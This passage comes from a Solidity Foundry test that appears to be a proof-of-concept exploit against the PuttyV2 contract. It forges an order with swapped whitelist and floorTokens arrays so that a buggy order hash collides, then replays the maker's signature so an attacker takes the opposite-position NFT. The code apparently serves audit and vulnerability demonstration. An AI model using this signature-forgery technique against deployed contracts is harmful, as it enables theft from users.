        PuttyV2.Order memory original = buildOrder(vm.addr(makerKey), true, true);
        original.whitelist = new address[](1);
        original.whitelist[0] = signalAddr;
        original.floorTokens = new address[](0);

        bytes32 signedHash = target.hashOrder(original);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(makerKey, signedHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        // forged order: arrays swapped -> due to buggy hash, hash will collide
        PuttyV2.Order memory forged = buildOrder(vm.addr(makerKey), true, true);
        forged.whitelist = new address[](0);
        forged.floorTokens = new address[](1);
        forged.floorTokens[0] = signalAddr;

        // attacker calls fillOrder with forged order and maker's signature
        uint256[] memory floorAssetTokenIds = new uint256[](1);
        floorAssetTokenIds[0] = 42;

        vm.prank(attacker);
        target.fillOrder(forged, signature, floorAssetTokenIds);

        // attacker should now own the opposite position NFT
        bytes32 opp = target.hashOppositeOrder(forged);
        assertEq(target.ownerOf(uint256(opp)), attacker);
    }

    function buildOrder(address maker, bool isCall, bool isLong) internal pure returns (PuttyV2.Order memory o) {
        o.maker = maker;
        o.isCall = isCall;
        o.isLong = isLong;
        o.baseAsset = address(0x1);
        o.strike = 0;
        o.premium = 0;
        o.duration = 0;
        o.expiration = type(uint256).max;
        o.nonce = 0;
        o.erc20Assets = new PuttyV2.ERC20Asset[](0);
        o.erc721Assets = new PuttyV2.ERC721Asset[](0);
    }
}

